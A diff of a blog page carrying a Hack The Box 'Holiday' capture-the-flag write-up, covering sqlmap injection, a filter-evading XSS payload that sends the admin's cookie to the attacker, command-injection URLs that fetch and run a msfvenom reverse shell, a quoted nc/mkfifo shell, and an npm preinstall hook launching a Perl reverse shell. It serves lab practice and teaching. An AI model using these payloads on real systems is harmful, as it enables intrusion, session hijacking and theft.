@@ -19,7 +19,7 @@
   <meta name="description" content="Introduction Target: 10.10.10.25(Linux)
 Kali: 10.10.16.65
 Holiday is an insane box officially. It&amp;rsquo;s really difficult to get the user permission. The most difficult part should be how to pass the XSS filter. It may need a lot of time. And the root privesc is based on the exploitation of npm install which is relatively fresh.
-Information enumeration As usual, use nmap to detect open ports and related services: nmap -A 10." />
+Information enumeration As usual, use nmap to detect open ports and related services: nmap -A 10.10.10.25:" />
 
   
   
@@ -30,14 +30,13 @@ Information enumeration As usual, use nmap to detect open ports and related serv
   <meta property="og:description" content="Introduction Target: 10.10.10.25(Linux)
 Kali: 10.10.16.65
 Holiday is an insane box officially. It&amp;rsquo;s really difficult to get the user permission. The most difficult part should be how to pass the XSS filter. It may need a lot of time. And the root privesc is based on the exploitation of npm install which is relatively fresh.
-Information enumeration As usual, use nmap to detect open ports and related services: nmap -A 10." />
+Information enumeration As usual, use nmap to detect open ports and related services: nmap -A 10.10.10.25:" />
   <meta property="og:url" content="https://madneal.com/post/holiday-hack-the-box/" />
   <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
 
 
 
-<meta name="generator" content="Hugo 0.46" />
 
 
 <link rel="canonical" href="https://madneal.com/post/holiday-hack-the-box/" />
@@ -223,23 +222,14 @@ Information enumeration As usual, use nmap to detect open ports and related serv
       <h1 class="post-title">Holiday -- hack the box</h1>
       <p class="post-meta">@Neal · May 20, 2019 · 6 min read</p>
     </header>
-    <article class="post-content">
-
-<p><img src="https://s2.ax1x.com/2019/05/20/EvqqqH.png" alt="EvqqqH.png" /></p>
-
+    <article class="post-content"><p><img src="https://s2.ax1x.com/2019/05/20/EvqqqH.png" alt="EvqqqH.png"></p>
 <h2 id="introduction">Introduction</h2>
-
 <p>Target: 10.10.10.25(Linux)</p>
-
 <p>Kali: 10.10.16.65</p>
-
 <p>Holiday is an insane box officially. It&rsquo;s really difficult to get the user permission. The most difficult part should be how to pass the XSS filter. It may need a lot of time. And the root privesc is based on the exploitation of npm install which is relatively fresh.</p>
-
 <h2 id="information-enumeration">Information enumeration</h2>
-
 <p>As usual, use nmap to detect open ports and related services: <code>nmap -A 10.10.10.25</code>:</p>
-
-<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 09:49 GMT
+<pre tabindex="0"><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 09:49 GMT
 Nmap scan report for htb.holiday (10.10.10.25)
 Host is up (0.67s latency).
 Not shown: 998 closed ports
@@ -271,19 +261,12 @@ TRACEROUTE (using port 111/tcp)
 HOP RTT       ADDRESS
 1   630.30 ms 10.10.16.1
 2   322.47 ms htb.holiday (10.10.10.25)
-</code></pre>
-
-<p>There are only two ports open. The port 8000 is an HTTP service which is hosted by Express. It should be our breakthrough.</p>
-
+</code></pre><p>There are only two ports open. The port 8000 is an HTTP service which is hosted by Express. It should be our breakthrough.</p>
 <h2 id="exploitation">Exploitation</h2>
-
 <p>Access to <code>http://10.10.10.25:8000</code>, there is nothing except an image. Download the image, and try to see more information about the image with ExifTool. Nothing interesting found.</p>
-
-<p><a href="https://imgchr.com/i/EjY0mV"><img src="https://s2.ax1x.com/2019/05/19/EjY0mV.png" alt="EjY0mV.png" /></a></p>
-
+<p><a href="https://imgchr.com/i/EjY0mV"><img src="https://s2.ax1x.com/2019/05/19/EjY0mV.png" alt="EjY0mV.png"></a></p>
 <p>Then try to brute force the directory. Gobuster and dirbuster seem not to be very useful for this box. If you try dirb, you will soon find some important directories, including admin, login. Try to access <code>http://10.10.10.25:8000/login</code>. It is a login web page. Try to login with some default credentials. Not work. Then use burp to save the login request to a file.</p>
-
-<pre><code>POST /login HTTP/1.1
+<pre tabindex="0"><code>POST /login HTTP/1.1
 Host: 10.10.10.25:8000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -296,126 +279,81 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 
 username=admin&amp;password=admin
-</code></pre>
-
-<h3 id="sqlmap">Sqlmap</h3>
-
+</code></pre><h3 id="sqlmap">Sqlmap</h3>
 <p>Try to use sqlmap to brute force the login request. Due to the awful network or something, sqlmap is slow for me to use for the boxed in hack the box. So try to prefer to get some important information instead of dump all information in sqlmap. For example, obtain tables firstly. Then dig into the interesting table.</p>
-
-<pre><code>sqlmap -r sql.req --level=5 --risk=3 --tables --threads=10
-</code></pre>
-
-<p><a href="https://imgchr.com/i/Ejdcss"><img src="https://s2.ax1x.com/2019/05/19/Ejdcss.md.png" alt="Ejdcss.md.png" /></a></p>
-
+<pre tabindex="0"><code>sqlmap -r sql.req --level=5 --risk=3 --tables --threads=10
+</code></pre><p><a href="https://imgchr.com/i/Ejdcss"><img src="https://s2.ax1x.com/2019/05/19/Ejdcss.md.png" alt="Ejdcss.md.png"></a></p>
 <p>By sqlmap, it seems that the database is SQLite and there are 5 tables. The <code>users</code> table is interesting. There may are some valid user and password.</p>
-
-<pre><code>sqlmap -r sql.req --level=5 --risk=4 -T users --threads=10
-</code></pre>
-
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej4acR.png" alt="Ej4acR.png" /></p>
-
+<pre tabindex="0"><code>sqlmap -r sql.req --level=5 --risk=4 -T users --threads=10
+</code></pre><p><img src="https://s2.ax1x.com/2019/05/19/Ej4acR.png" alt="Ej4acR.png"></p>
 <p>A user is found. <a href="https://hashkiller.co.uk/Cracker">Hashkiller</a> is a wonderful hash crack online tool. The hash can be cracked easily.</p>
-
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej464e.png" alt="Ej464e.png" /></p>
-
+<p><img src="https://s2.ax1x.com/2019/05/19/Ej464e.png" alt="Ej464e.png"></p>
 <p>Log in with this user. It seems to be a booking website.</p>
-
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej5nUO.png" alt="Ej5nUO.png" /></p>
-
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej4Lgs.png" alt="Ej4Lgs.png" /></p>
-
+<p><img src="https://s2.ax1x.com/2019/05/19/Ej5nUO.png" alt="Ej5nUO.png"></p>
+<p><img src="https://s2.ax1x.com/2019/05/19/Ej4Lgs.png" alt="Ej4Lgs.png"></p>
 <p>Click any booking and see the booking details. It consists of two tabs, including View and Notes. In Notes, one word is interesting: &ldquo;All notes must be approved by an administrator - this process can take up to 1 minute.&rdquo; An administrator is always attractive to hackers. It seems that the note will be approved by the administrator. So it&rsquo;s possible to steal the session cookie of the administrator if there is an XSS vulnerability in the note edit form. I think it&rsquo;s the hardest part of this box. It&rsquo;s not easy to find the appropriate pass way. There is a way to utilize <code>fromCharCode</code> and other skills to pass the XSS filter. The following javascript code is utilized to generate the payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65&#39;</span>;
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`$.ajax({method:&#39;GET&#39;,url:&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;,success:function(data){$.post(&#39;http://10.10.16.65&#39;,data)}})`</span>;
-<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">str</span>);
-<span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
-  <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span>;
-}
-<span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
-<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">result</span>);
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;img src=&#34;x/&gt;&lt;script&gt;eval(String.fromCharCode(</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">));&lt;/script&gt;&#34;&gt;`</span>;
-<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">payload</span>);
-</code></pre></div>
-<p><img src="https://s2.ax1x.com/2019/05/19/Ejv2od.png" alt="Ejv2od.png" /></p>
-
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`$.ajax({method:&#39;GET&#39;,url:&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;,success:function(data){$.post(&#39;http://10.10.16.65&#39;,data)}})`</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">str</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">result</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">result</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`&lt;img src=&#34;x/&gt;&lt;script&gt;eval(String.fromCharCode(</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span><span style="color:#e6db74">}</span><span style="color:#e6db74">));&lt;/script&gt;&#34;&gt;`</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">payload</span>);
+</span></span></code></pre></div><p><img src="https://s2.ax1x.com/2019/05/19/Ejv2od.png" alt="Ejv2od.png"></p>
 <p>Set kali to listen to port 80: <code>nc -lvnp 80</code>. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali.</p>
-
 <p>The cookie of the administrator is obtained which is HTML encoded. Decode it with a burp. And change the cookie in the storage of firefox. Refresh the web page. Now you can hijack the administrator session cookie. Access to <code>http://10.10.10.25:8000/admin</code>. There seems nothing special except two buttons, including Booking and Notes.</p>
-
-<p><img src="https://s2.ax1x.com/2019/05/19/Ej4oE8.png" alt="admin" /></p>
-
-<p><img src="https://s2.ax1x.com/2019/05/19/EjjOxK.png" alt="EjjOxK.png" /></p>
-
+<p><img src="https://s2.ax1x.com/2019/05/19/Ej4oE8.png" alt="admin"></p>
+<p><img src="https://s2.ax1x.com/2019/05/19/EjjOxK.png" alt="EjjOxK.png"></p>
 <p>After some exploration, you will find that there is command injection in the two function url. You can try to access <code>http://10.10.10.25:8000/admin/export?table=notes%26ls</code>. You can find the directories in the exported file. One thing should be noticed, as <code>&amp;</code> has been prohibited. So you can pass this by <code>%26</code>. Hence, it seems that the table name exists RCE. But it&rsquo;s limited to characters, numbers and <code>/</code>. So you should try to RCE by these. It&rsquo;s not possible to use the command to obtain reverse shell by command. For example, <code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code>. As many characters is not allowed.</p>
-
-<p><img src="https://s2.ax1x.com/2019/05/20/Ev7Txg.png" alt="Ev7Txg.png" /></p>
-
+<p><img src="https://s2.ax1x.com/2019/05/20/Ev7Txg.png" alt="Ev7Txg.png"></p>
 <p>Utilize msfvenom to generate the payload:</p>
-
-<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.65 LPORT=1234 -f elf &gt; shell
-</code></pre>
-
-<p>Then upload the shell to the victim and execute it. As you are not allowed to use <code>.</code>. So convert the IP address to decimal by <a href="https://www.ipaddressguide.com/ip">this website</a>. Access the following URLs to execute the corresponding commands:</p>
-
+<pre tabindex="0"><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.65 LPORT=1234 -f elf &gt; shell
+</code></pre><p>Then upload the shell to the victim and execute it. As you are not allowed to use <code>.</code>. So convert the IP address to decimal by <a href="https://www.ipaddressguide.com/ip">this website</a>. Access the following URLs to execute the corresponding commands:</p>
 <ul>
 <li>upload shell: <code>http://10.10.10.25:8000/admin/export?table=notes%26cd%20/tmp%20%26%26wget%20168431681/shell</code></li>
 <li>change permission: <code>http://10.10.10.25:8000/admin/export?table=notes%26chmod%20777%20/tmp/shell</code></li>
 <li>execute shell: <code>http://10.10.10.25:8000/admin/export?table=notes%26cd%20/tmp/shell</code></li>
 </ul>
-
 <p>Before running the shell, you should set meterpreter in Kaili.</p>
-
-<pre><code>use exploit/multi/handler
+<pre tabindex="0"><code>use exploit/multi/handler
 set LHOST 10.10.16.65
 set LPORT 1234
 set payload linux/x86/meterpreter/reverse_tcp
 run
-</code></pre>
-
-<p>Then, we get the shell!</p>
-
-<p><img src="https://s2.ax1x.com/2019/05/20/Evb1cF.png" alt="Evb1cF.png" /></p>
-
-<p><img src="https://s2.ax1x.com/2019/05/20/EvbGnJ.png" alt="EvbGnJ.png" /></p>
-
+</code></pre><p>Then, we get the shell!</p>
+<p><img src="https://s2.ax1x.com/2019/05/20/Evb1cF.png" alt="Evb1cF.png"></p>
+<p><img src="https://s2.ax1x.com/2019/05/20/EvbGnJ.png" alt="EvbGnJ.png"></p>
 <h2 id="privilege-escalation">Privilege escalation</h2>
-
 <p>Check the sudo permissions firstly: <code>sudo -l</code>. You will find the user has the permission to execute <code>sudo npm i</code>. <a href="https://github.com/joaojeronimo/rimrafall">rimrafall</a> this repository has described that npm install may be dangerous. It can be utilized to execute commands. You can upload the directory to the victim or create one by yourself.</p>
-
-<pre><code>cd app
+<pre tabindex="0"><code>cd app
 mkdir rimrafall
 cd rimrafall
-echo &quot;module.exports = &quot;install my be dangerousr&quot;&quot; &gt; index.js
-</code></pre>
-
-<p>Create the <code>package.json</code> and upload it to the target directory. <code>preinstall</code> can be utilized to execute the command. I have found that some command to obtain a reverse shell is not useful. As Perl is installed in the machine. And create a file called prel3 to obtain the reverse shell.</p>
-
-<pre><code>
+echo &#34;module.exports = &#34;install my be dangerousr&#34;&#34; &gt; index.js
+</code></pre><p>Create the <code>package.json</code> and upload it to the target directory. <code>preinstall</code> can be utilized to execute the command. I have found that some command to obtain a reverse shell is not useful. As Perl is installed in the machine. And create a file called prel3 to obtain the reverse shell.</p>
+<pre tabindex="0"><code>
 {
-  &quot;name&quot;: &quot;rimrafall&quot;,
-  &quot;version&quot;: &quot;1.0.0&quot;,
-  &quot;description&quot;: &quot;rm -rf /* # DO NOT INSTALL THIS&quot;,
-  &quot;main&quot;: &quot;index.js&quot;,
-  &quot;scripts&quot;: {
-    &quot;preinstall&quot;: &quot;perl prel3&quot;
+  &#34;name&#34;: &#34;rimrafall&#34;,
+  &#34;version&#34;: &#34;1.0.0&#34;,
+  &#34;description&#34;: &#34;rm -rf /* # DO NOT INSTALL THIS&#34;,
+  &#34;main&#34;: &#34;index.js&#34;,
+  &#34;scripts&#34;: {
+    &#34;preinstall&#34;: &#34;perl prel3&#34;
   },
-  &quot;keywords&quot;: [
-    &quot;rimraf&quot;,
-    &quot;rmrf&quot;
+  &#34;keywords&#34;: [
+    &#34;rimraf&#34;,
+    &#34;rmrf&#34;
   ],
-  &quot;author&quot;: &quot;João Jerónimo&quot;,
-  &quot;license&quot;: &quot;ISC&quot;
+  &#34;author&#34;: &#34;João Jerónimo&#34;,
+  &#34;license&#34;: &#34;ISC&#34;
 }
-</code></pre>
-
-<pre><code>#prel3
-use Socket;$i=&quot;10.10.16.65&quot;;$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};
-</code></pre>
-
-<p>Set kali listen to port 3344: <code>nc -lvnp 3344</code>. In the victim, executed by: <code>sudo npm i rimrafall</code>. Now, we are root!</p>
-
-<p><img src="https://s2.ax1x.com/2019/05/20/EvqfaR.png" alt="EvqfaR.png" /></p>
+</code></pre><pre tabindex="0"><code>#prel3
+use Socket;$i=&#34;10.10.16.65&#34;;$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};
+</code></pre><p>Set kali listen to port 3344: <code>nc -lvnp 3344</code>. In the victim, executed by: <code>sudo npm i rimrafall</code>. Now, we are root!</p>
+<p><img src="https://s2.ax1x.com/2019/05/20/EvqfaR.png" alt="EvqfaR.png"></p>
 </article>
     <footer class="post-footer">
         <p>欢迎搜索微信号 mad_coder 或者扫描二维码关注公众号：</p>
@@ -440,13 +378,13 @@ use Socket;$i=&quot;10.10.16.65&quot;;$p=3344;socket(S,PF_INET,SOCK_STREAM,getpr
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>1087</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>1100</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
       <div id="disqus_thread"></div>
-<script>
-    var disqus_config = function () {
+<script type="application/javascript">
+    window.disqus_config = function () {
     
     
     
@@ -500,7 +438,7 @@ use Socket;$i=&quot;10.10.16.65&quot;;$p=3344;socket(S,PF_INET,SOCK_STREAM,getpr
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
 
 
-<script>
+<script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
 	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
